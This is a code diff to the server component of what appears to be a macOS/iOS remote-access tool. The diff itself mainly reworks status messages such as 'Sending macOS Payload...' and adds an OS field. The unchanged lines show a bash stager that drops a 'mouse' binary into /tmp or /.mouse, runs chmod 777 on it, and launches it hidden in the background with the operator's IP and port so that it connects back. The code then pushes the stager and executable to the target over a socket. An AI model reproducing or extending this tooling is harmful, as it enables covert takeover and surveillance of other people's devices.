@@ -15,6 +15,7 @@ class Server:
         self.ios_architectures = ["arm64","armv7s", "arm"]
         self.host = None
         self.port = None
+        self.sos = None
         self.debug = False
         self.is_multi = False
         self.modules_macos = self.import_modules("modules/commands/macOS")
@@ -40,8 +41,10 @@ class Server:
     def get_modules(self,device_type):
         if device_type == "macos": 
             result = self.modules_macos
+            self.sos = "macOS"
         elif device_type == "iOS":
             result = self.modules_ios
+            self.sos = "iOS"
         result.update(self.modules_universal)
         return result
 
@@ -105,7 +108,8 @@ class Server:
             return
         payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":self.debug}))
         if device_arch in self.macos_architectures:
-            self.verbose_print("Detected macOS")
+            self.verbose_print("Connecting to macOS...")
+            self.verbose_print("Sending macOS Payload...")
             f = open("resources/macos", "rb")
             payload = f.read()
             f.close()
@@ -114,9 +118,11 @@ class Server:
             "cat >/private/tmp/mouse;"+\
             "chmod 777 /private/tmp/mouse;"+\
             "/private/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
+            self.verbose_print("Executing macOS Payload...")
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
-            self.verbose_print("Detected iOS")
+            self.verbose_print("Connecting to iOS...")
+            self.verbose_print("Sending iOS Payload...")
             f = open("resources/ios", "rb")
             payload = f.read()
             f.close()
@@ -125,6 +131,7 @@ class Server:
             "chmod 777 /tmp/mouse;"+\
             "mv /tmp/mouse /.mouse;"+\
             "/.mouse "+payload_parameter+" 2>/dev/null &\n"
+            self.verbose_print("Executing iOS Payload...") 
             return (instructions,payload)
         else:
             h.info_error("The device is not recognized!")
@@ -160,12 +167,10 @@ class Server:
         except Exception as e:
             raw_input("Press enter to continue...")
             return
-        self.verbose_print("Sending Mouse Payload...")
         self.debug_print(bash_stager.strip())
         conn.send(bash_stager)
 
         # send executable
-        self.debug_print("Sending Mouse Executable...")
         conn.send(executable)
         conn.close()
         self.verbose_print("Establishing Connection...")
